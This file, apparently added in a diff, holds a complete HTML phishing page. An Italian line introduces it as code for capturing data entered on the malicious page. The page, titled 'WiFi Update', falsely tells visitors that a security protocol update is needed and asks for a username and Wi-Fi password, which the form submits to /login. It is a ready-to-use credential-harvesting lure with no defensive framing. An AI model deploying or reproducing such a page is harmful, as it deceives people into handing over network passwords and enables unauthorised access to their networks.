@@ -1,0 +1,26 @@
+Codice della pagina utilizzato per captare i dati che vengono inseriti nella pagina malevola:
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>WiFi Update</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: Arial; text-align: center; padding: 50px; background-color: #f4f4f4; }
+        .container { background: white; padding: 20px; border-radius: 10px; box-shadow: 0px 0px 10px #ccc; }
+        input { padding: 10px; width: 80%; margin: 10px 0; border: 1px solid #ddd; }
+        button { padding: 10px 20px; background-color: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Aggiornamento Necessario</h1>
+        <p>Per continuare a navigare, inserisci la password del Wi-Fi per aggiornare il protocollo di sicurezza.</p>
+        <form method="GET" action="/login">
+            <input type="text" name="user" placeholder="Username" required><br>
+            <input type="password" name="password" placeholder="Password Wi-Fi" required><br>
+            <button type="submit">Aggiorna Ora</button>
+        </form>
+    </div>
+</body>
+</html>
